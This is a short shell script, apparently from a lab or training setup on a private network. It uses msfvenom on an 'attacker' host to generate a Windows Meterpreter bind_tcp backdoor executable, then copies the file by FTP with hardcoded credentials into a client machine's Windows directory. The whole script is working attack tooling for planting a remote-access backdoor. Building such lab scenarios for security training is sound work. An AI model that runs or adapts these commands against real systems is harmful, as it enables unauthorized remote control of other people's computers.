#!/usr/bin/env sh

# Creates a simple backdoor executable using Metasploit in the Attacker's Web
# directory and also copies it to the Client's Windows directory

ATTACKER_HOST="192.168.56.31"
ATTACKER_PATH="/var/www/vhost.com"
CLIENT_HOST="192.168.56.101"
EXE_FILENAME="meterpreter_bind_tcp.exe"

ssh root@$ATTACKER_HOST "

cd $ATTACKER_PATH

msfvenom --arch x86 --platform windows --format exe --out $EXE_FILENAME --payload windows/meterpreter/bind_tcp LPORT=1337

ftp -n -v $CLIENT_HOST << EOF
user breach breach
cd Windows
binary
send $EXE_FILENAME
bye
EOF

"
